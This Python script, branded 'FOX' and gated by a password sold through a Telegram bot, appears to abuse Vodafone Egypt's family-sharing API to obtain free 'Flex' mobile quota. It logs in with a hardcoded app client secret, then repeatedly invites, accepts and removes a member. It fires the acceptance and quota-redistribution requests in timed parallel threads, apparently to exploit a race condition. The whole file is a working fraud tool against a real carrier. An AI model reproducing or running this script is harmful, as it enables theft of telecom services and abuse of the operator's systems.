import requests
import json
import threading
import time
import webbrowser
import sys


Z = '\x1b[2;31m'# Red
A = '\x1b[2;39m'
F = '\033[1;32m' #اخضر
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
PN='\033[1;35m' #BINK
X = '\033[1;33m' # Yellow

try:
    from pyfiglet import Figlet
    from termcolor import colored
except Exception:
    import sys, subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyfiglet", "termcolor"])
    from pyfiglet import Figlet
    from termcolor import colored
name = "             FOX"
f = Figlet(font="doom") 
art = f.renderText(name)
colors = ["red", "yellow", "green", "cyan", "magenta"]

for i, line in enumerate(art.splitlines()):
    print(colored(line, colors[i % len(colors)], attrs=["bold"]))

print(Y+f'{Bl}╔━━━━━━━━━━━━━━━━👑👑━━━━━━━━━━━━━━━━━━━╗               ')
print(R+f'➧   [+]{Y}BY {R}¦  {G}FOX🕸️                     ')
print('')

print(R+f'➧   [+]{G}50000 {R}Flex🍀                  ')
print('')
print(R+f'➧   [+]{Y}My Chanal : https://t.me/O_PR0 🍀    ')
print(Y+f'{Bl}╚━━━━━━━━━━━━━━━━👑👑━━━━━━━━━━━━━━━━━━━╝              ')
print('')


fox = input(R+f' [+] {Y}Enter The Password {R}:{G} ')

url = "https://raw.githubusercontent.com/foxfox0/Amk_asrk/refs/heads/main/Pass"
try:
    response = requests.get(url, timeout=10)
    first_line = response.text.splitlines()[0]
    if fox == first_line:
        pass
    else:
        print()
        print(f' {Bl}𝐄𝐑𝐎𝐑𝐑🔴 {Y}: {R}Wrong password')
        
        webbrowser.open("http://t.me/Fox_pass_50000Bot")
        exit()
except requests.exceptions.RequestException as e:
    print(f' {Bl}𝐄𝐑𝐎𝐑𝐑🔴 {Y}: {R}تحقق من الاتصال ب الانترنت')
    exit()

number = input(R+f' [+] {Y}Enter(رقم المالك){R}:{G} ')
password = input(R+f' [+] {Y}Enter(باسورد المالك){R}:{G} ')
fardnum = input(R+f' [+] {Y}Enter(رقم الفرد الطاير){R}:{G} ')
pass_fardnum = input(R+f' [+] {Y}Enter(باسورد الفرد الطاير){R}:{G} ')
fristfard = input(R+f' [+] {Y}Enter(رقم الفرد الثابت){R}:{G} ')
re = input(R+f' [+] {Y}Enter(عدد الدورات) {R}:{G} ')   
print()
def jalan(z):
    for e in z + '\n' :
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
        
jalan(PN+f'     ----> {G}start 50000&Flex{PN} <----')


for i in range(int(re)):
    print()
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    payload = {
  'grant_type': "password",
  'username': number,
  'password': password,
  'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
  'client_id': "ana-vodafone-app"
}

    headers = {
  'User-Agent': "okhttp/4.11.0",
  'Accept': "application/json, text/plain, */*",
  'Accept-Encoding': "gzip",
  'silentLogin': "false",
  'x-agent-operatingsystem': "13",
  'clientId': "AnaVodafoneAndroid",
  'Accept-Language': "ar",
  'x-agent-device': "Xiaomi 21061119AG",
  'x-agent-version': "2024.12.1",
  'x-agent-build': "946",
  'digitalId': "28RI9U7IINOOB"
}

    response = requests.post(url, data=payload, headers=headers)
    try:
        tok = response.json()['access_token']
    except:
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}number or password error{B}¬¦¬>{G}❌{B}¦ {PN}@{Bl}F_0_01')
        exit()
        
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

    headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
  'msisdn': number,
  'Accept-Language': "EN",
  'sec-ch-ua-mobile': "?1",
  'Authorization': f"Bearer {tok}",
  'clientId': "WebsiteConsumer",
  'sec-ch-ua-platform': "\"Android\"",
  'Origin': "https://web.vodafone.com.eg",
  'Sec-Fetch-Site': "same-origin",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://web.vodafone.com.eg/spa/familySharing",
}
    
    
    payload = {
  "name": "FlexFamily",
  "type": "SendInvitation",
  "category": [
    {
      "value": "523",
      "listHierarchyId": "PackageID"
    },
    {
      "value": "47",
      "listHierarchyId": "TemplateID"
    },
    {
      "value": "523",
      "listHierarchyId": "TierID"
    },
    {
      "value": "percentage",
      "listHierarchyId": "familybehavior"
    }
  ],
  "parts": {
    "member": [
      {
        "id": [
          {
            "value": number,
            "schemeName": "MSISDN"
          }
        ],
        "type": "Owner"
      },
      {
        "id": [
          {
            "value": fardnum,
            "schemeName": "MSISDN"
          }
        ],
        "type": "Member"
      }
    ],
    "characteristicsValue": {
      "characteristicsValue": [
        {
          "characteristicName": "quotaDist1",
          "value": "40",
          "type": "percentage"
        }
      ]
    }
  }
}
    
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    if "{}" in response.text:
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}invite [{fardnum}] 5200 Flax{B}¬¦¬>{G}✅{B}¦ {PN}@{Bl}F_0_01')
    else:
        try:
            foxx = response.json()['message']
        except:
            foxx = response.json()
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}invite [{fardnum}] 5200 Flax{B}¬¦¬>{R}{foxx}{B}¦ {PN}@{Bl}F_0_01')
        
    print()
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    
    payload = {
      'grant_type': "password",
      'username': fardnum,
      'password': pass_fardnum,
      'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
      'client_id': "ana-vodafone-app"
    }
    
    headers = {
      'User-Agent': "okhttp/4.11.0",
      'Accept': "application/json, text/plain, */*",
      'Accept-Encoding': "gzip",
      'silentLogin': "false",
      'x-agent-operatingsystem': "13",
      'clientId': "AnaVodafoneAndroid",
      'Accept-Language': "ar",
      'x-agent-device': "Xiaomi 21061119AG",
      'x-agent-version': "2024.12.1",
      'x-agent-build': "946",
      'digitalId': "28RI9U7IINOOB"
    }
    
    response = requests.post(url, data=payload, headers=headers)
    try:
        tok1 = response.json()['access_token']
    except:
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}number or password scende number{B}¬¦¬>{G}❌{B}¦ {PN}@{Bl}F_0_01')
        
        exit()

    def accept_invitation():
        start_time = time.time() 
        
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        payload = {
  "category": [
    {
      "listHierarchyId": "TemplateID",
      "value": "47"
    }
  ],
  "name": "FlexFamily",
  "parts": {
    "member": [
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": f"2{number}"
          }
        ],
        "type": "Owner"
      },
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": f"2{fardnum}"
          }
        ],
        "type": "Member"
      }
    ]
  },
  "type": "AcceptInvitation"
}
        headers = {
  'User-Agent': "okhttp/4.11.0",
  'Connection': "Keep-Alive",
  'Accept': "application/json",
  'Accept-Encoding': "gzip",
  'Content-Type': "application/json",
  'api_id': "APP",
  'x-dynatrace': "MT_3_24_3486379639_70-0_a556db1b-4506-43f3-854a-1d2527767923_0_188_179",
  'Authorization': f"Bearer {tok1}",
  'api-version': "v2",
  'x-agent-operatingsystem': "13",
  'clientId': "AnaVodafoneAndroid",
  'x-agent-device': "Xiaomi 21061119AG",
  'x-agent-version': "2024.12.1",
  'x-agent-build': "946",
  'msisdn': fardnum,
  'Accept-Language': "ar",
  'Content-Type': "application/json; charset=UTF-8"
}
        response = requests.patch(url, data=json.dumps(payload), headers=headers)
        end_time = time.time()
        elapsed = round(end_time - start_time, 2)
        if "{}" in response.text:
            print(f'{Bl}[ {C}{i+1} {Bl}][ {C}{elapsed} ⏰{Bl}]{C}>> {G}Accept invitation [{fardnum}] 5200 Flax{B}¬¦¬>{G}✅{B}¦ {PN}@{Bl}F_0_01')
            
        else:
            try:
                foxx = response.json()["reason"]
            except:
                foxx = response.json()
            print(f'{Bl}[ {C}{i+1} {Bl}][ {C}{elapsed} ⏰{Bl}]{C}>> {G}Accept invitation [{fardnum}] 5200 Flax{B}¬¦¬>{R}{foxx}{B}¦ {PN}@{Bl}F_0_01')
        
    
    def change_quota():
        
        start_time = time.time() 
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        payload = {
  "category": [
    {
      "listHierarchyId": "TemplateID",
      "value": "47"
    }
  ],
  "createdBy": {
    "value": "MobileApp"
  },
  "parts": {
    "characteristicsValue": {
      "characteristicsValue": [
        {
          "characteristicName": "quotaDist1",
          "type": "percentage",
          "value": "40"
        }
      ]
    },
    "member": [
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": number
          }
        ],
        "type": "Owner"
      },
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": f"2{fristfard}",
          }
        ],
        "type": "Member"
      }
    ]
  },
  "type": "QuotaRedistribution"
}
        headers = {
  'User-Agent': "okhttp/4.11.0",
  'Connection': "Keep-Alive",
  'Accept': "application/json",
  'Accept-Encoding': "gzip",
  'Content-Type': "application/json",
  'x-dynatrace': "MT_3_5_3404623375_5-0_a556db1b-4506-43f3-854a-1d2527767923_0_205_189",
  'Authorization': f"Bearer {tok}",
  'api-version': "v2",
  'x-agent-operatingsystem': "13",
  'clientId': "AnaVodafoneAndroid",
  'x-agent-device': "Xiaomi 21061119AG",
  'x-agent-version': "2024.12.1",
  'x-agent-build': "946",
  'msisdn': number,
  'Accept-Language': "ar",
  'Content-Type': "application/json; charset=UTF-8"
}
  
        response = requests.patch(url, data=json.dumps(payload), headers=headers)
        end_time = time.time()
        elapsed = round(end_time - start_time, 2)
        print()

        if "{}" in response.text:
            print(f'{Bl}[ {C}{i+1} {Bl}][ {C}{elapsed} ⏰{Bl}]{C}>> {G}Change Quota [{fristfard}] to 5200 Flax{B}¬¦¬>{G}✅{B}¦ {PN}@{Bl}F_0_01')
            
        else:
            try:
                foxx = response.json()["reason"]
            except:
                foxx = response.json()
            print(f'{Bl}[ {C}{i+1} {Bl}][ {C}{elapsed} ⏰{Bl}]{C}>> {G}Change Quota [{fristfard}] to 5200 Flax{B}¬¦¬>{R}{foxx}{B}¦ {PN}@{Bl}F_0_01')
        
    
    t1 = threading.Thread(target=change_quota)
    t2 = threading.Thread(target=accept_invitation)
    t2.start()
    time.sleep(.61)
    t1.start()
    t1.join()
    print()
    t2.join()
    print()
    url = f"https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={number}&@type=aggregated"
    headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'sec-ch-ua-platform': "\"Android\"",
  'Authorization': f"Bearer {tok}",
  'Accept-Language': "AR",
  'msisdn': number,
  'sec-ch-ua': "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
  'clientId': "WebsiteConsumer",
  'sec-ch-ua-mobile': "?1",
  'Content-Type': "application/json",
  'Sec-Fetch-Site': "same-origin",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://web.vodafone.com.eg/spa/myHome",
}

    response = requests.get(url, headers=headers)
    data = response.json()
    for item in data:
        if "bucket" in item:
            for bucket in item["bucket"]:
                if bucket.get("usageType") == "limit":
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining":
                            amount = balance["remainingValue"]["amount"]
                            
                            
                            
                            print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}Your flex{B}¬¦¬>{G}{amount}{B}¦ {PN}@{Bl}F_0_01')
                            
                            #
    t = 10
    for ii in range(t, 0, -1):
       print(f"\r{Bl} [{C}+{Bl}] {G}Wait {Bl}[{C}{ii}{Bl}] {Y}second ", end='', flush=True)
       time.sleep(1)
    print("\r" + " " * 30, end='\r') 
    print()
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
  "category": [
    {
      "listHierarchyId": "TemplateID",
      "value": "47"
    }
  ],
  "createdBy": {
    "value": "MobileApp"
  },
  "parts": {
    "characteristicsValue": {
      "characteristicsValue": [
        {
          "characteristicName": "Disconnect",
          "value": "0"
        },
        {
          "characteristicName": "LastMemberDeletion",
          "value": "1"
        }
      ]
    },
    "member": [
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": number,
          }
        ],
        "type": "Owner"
      },
      {
        "id": [
          {
            "schemeName": "MSISDN",
            "value": f"2{fardnum}"
          }
        ],
        "type": "Member"
      }
    ]
  },
  "type": "FamilyRemoveMember"
}
    
    headers = {
  'User-Agent': "okhttp/4.11.0",
  'Connection': "Keep-Alive",
  'Accept': "application/json",
  'Accept-Encoding': "gzip",
  'Content-Type': "application/json",
  'x-dynatrace': "MT_3_15_3486379639_68-0_a556db1b-4506-43f3-854a-1d2527767923_0_247_122",
  'Authorization': f"Bearer {tok}",
  'api-version': "v2",
  'x-agent-operatingsystem': "13",
  'clientId': "AnaVodafoneAndroid",
  'x-agent-device': "Xiaomi 21061119AG",
  'x-agent-version': "2024.12.1",
  'x-agent-build': "946",
  'msisdn': number,
  'Accept-Language': "ar",
  'Content-Type': "application/json; charset=UTF-8"
}
    
    response = requests.patch(url, data=json.dumps(payload), headers=headers)
    if "{}" in response.text:
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}Delete [{fardnum}] From the family{B}¬¦¬>{G}✅{B}¦ {PN}@{Bl}F_0_01')
        
    else:
        try:
            foxx = response.json()["reason"]
        except:
            foxx = response.json()
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}Delete [{fardnum}] From the family{B}¬¦¬>{R}{foxx}{B}¦ {PN}@{Bl}F_0_01')
        
    t = 330
    for ii in range(t, 0, -1):
       print(f"\r{Bl} [{C}+{Bl}] {G}Wait {Bl}[{C}{ii}{Bl}] {Y}second ", end='', flush=True)
       time.sleep(1)
    print("\r" + " " * 30, end='\r') 
    print()
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
          "name": "FlexFamily",
          "type": "QuotaRedistribution",
          "category": [
            {"value": "523", "listHierarchyId": "PackageID"},
            {"value": "47", "listHierarchyId": "TemplateID"},
            {"value": "523", "listHierarchyId": "TierID"},
            {"value": "percentage", "listHierarchyId": "familybehavior"}
          ],
          "parts": {
            "member": [
              {"id": [{"value": number, "schemeName": "MSISDN"}], "type": "Owner"},
              {"id": [{"value": "2" + fristfard, "schemeName": "MSISDN"}], "type": "Member"}
            ],
            "characteristicsValue": {
              "characteristicsValue": [
                {"characteristicName": "quotaDist1", "value": "10", "type": "percentage"}
              ]
            }
          }
        }
    headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 11; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
          'Accept': "application/json",
          'Content-Type': "application/json",
          'sec-ch-ua': "\"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"",
          'msisdn': number,
          'Accept-Language': "AR",
          'sec-ch-ua-mobile': "?1",
          'Authorization': f"Bearer {tok}",
          'x-dtpc': "5$160966758_702h19vRCUAEMOMIIASTHWKLEMFNIHJNUTANVVK-0e0",
          'clientId': "WebsiteConsumer",
          'sec-ch-ua-platform': "\"Android\"",
          'Origin': "https://web.vodafone.com.eg",
          'Sec-Fetch-Site': "same-origin",
          'Sec-Fetch-Mode': "cors",
          'Sec-Fetch-Dest': "empty",
          'Referer': "https://web.vodafone.com.eg/spa/familySharing",
        }
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    if "{}" in response.text:
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}Change Quote [{fristfard}] to 1300 Flex{B}¬¦¬>{G}✅{B}¦ {PN}@{Bl}F_0_01')
    else:
        try:
            foxx = response.json()["message"]
        except:
            foxx = response.json()
        print(f'{Bl}[ {C}{i+1} {Bl}]{C}>> {G}Change Quote [{fristfard}] to 1300 Flex{B}¬¦¬>{R}{foxx}{B}¦ {PN}@{Bl}F_0_01')
        
    t = 330
    for ii in range(t, 0, -1):
       print(f"\r{Bl} [{C}+{Bl}] {G}Wait {Bl}[{C}{ii}{Bl}] {Y}second ", end='', flush=True)
       time.sleep(1)
    print("\r" + " " * 30, end='\r') 




